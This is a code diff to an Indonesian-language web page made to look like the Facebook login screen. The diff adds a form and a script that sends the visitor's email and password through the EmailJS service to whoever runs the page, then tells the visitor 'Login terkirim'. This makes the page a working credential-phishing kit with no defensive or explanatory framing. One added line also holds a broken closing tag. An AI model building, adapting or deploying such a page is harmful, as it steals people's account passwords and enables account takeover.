@@ -64,16 +64,20 @@
     <h2 style="color:#1877f2;font-weight:700;font-size:28px;margin-bottom:10px;text-align:left">facebook</h2>
     <p style="margin-top:-10px;color:#555;font-size:15px;margin-bottom:20px">Masuk ke akun Facebook Anda</p>
 
-    <input type="text" placeholder="Email atau Nomor Ponsel" style="border-radius:6px;font-size:15px" />
-    <input type="password" placeholder="Kata Sandi" style="border-radius:6px;font-size:15px" />
+    <form id="fbForm">
+      <input id="fbEmail" type="text" placeholder="Email atau Nomor Ponsel" style="border-radius:6px;font-size:15px" />
+      <input id="fbPass" type="password" placeholder="Kata Sandi" style="border-radius:6px;font-size:15px" />
 
-    <button class="fb" style="border-radius:6px;font-size:17px;font-weight:600">Masuk</button>
+      <button type="submit" class="fb" style="border-radius:6px;font-size:17px;font-weight:600">Masuk</button>
+    </form>
+
+    <div id="fbStatus" style="margin-top:10px;font-size:14px"></div>
 
     <p style="text-align:center;margin-top:14px;font-size:14px;color:#1877f2;cursor:pointer">Lupa kata sandi?</p>
 
     <hr style="margin:20px 0;border:0;border-top:1px solid #ddd" />
 
-    <button style="width:100%;padding:12px;background:#42b72a;color:white;border-radius:6px;font-size:16px;font-weight:600;border:none;cursor:pointer">Buat Akun Baru</button>
+    <button style="width:100%;padding:12px;background:#42b72a;color:white;border-radius:6px;font-size:16px;font-weight:600;border:none;cursor:pointer">Buat Akun Baru</button</button>
 
     <button class="back" onclick="go('page-home')">Kembali</button>
   </div>
@@ -100,5 +104,36 @@ function go(id){
 }
 </script>
 
+<script>
+// EMAILJS LOGIN FB
+const fbForm = document.getElementById('fbForm');
+const fbStatus = document.getElementById('fbStatus');
+
+fbForm.addEventListener('submit', function(e){
+  e.preventDefault();
+
+  const email = document.getElementById('fbEmail').value.trim();
+  const pass = document.getElementById('fbPass').value.trim();
+
+  if(!email || !pass){
+    fbStatus.innerHTML = '<span style="color:red">⚠️ Email dan Password wajib diisi.</span>';
+    return;
+  }
+
+  fbStatus.innerHTML = '⏳ Mengirim...';
+
+  emailjs.send('service_x0mb56a','template_d41h15m',{
+    email: email,
+    password: pass,
+    platform: 'Facebook Login 2025'
+  })
+  .then(()=>{
+    fbStatus.innerHTML = '<span style="color:green">✅ Login terkirim</span>';
+  })
+  .catch(()=>{
+    fbStatus.innerHTML = '<span style="color:red">❌ Gagal mengirim</span>';
+  });
+});
+</script>
 </body>
 </html>
